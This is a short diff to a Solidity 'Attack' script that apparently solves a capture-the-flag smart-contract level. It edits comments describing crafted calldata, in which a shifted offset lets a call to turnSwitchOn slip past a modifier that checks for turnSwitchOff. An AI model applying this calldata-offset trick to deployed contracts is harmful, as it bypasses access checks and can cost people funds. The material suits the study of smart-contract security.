@@ -24,10 +24,10 @@ contract Attack is Script {
 
         // we structure the calldata like this:
         // - selector for flipSwitch (4 bytes)
-        // - offset of the data argument = 96 (32 bytes)
+        // - offset of the data argument = 96
         // - padding (32 bytes)
-        // - selector for turnSwitchOff (32 bytes) -- will be retrieved in modifier
-        // - selector for turnSwitchOn (32 bytes) = data argument -- will be called in flipSwitch
+        // - selector for turnSwitchOff -- will be retrieved in modifier
+        // - selector for turnSwitchOn = data argument -- will be called in flipSwitch
         bytes memory data = bytes.concat(
             sw.flipSwitch.selector, bytes32(uint256(96)), bytes32(0), offSelector, bytes32(uint256(4)), onSelector
         );
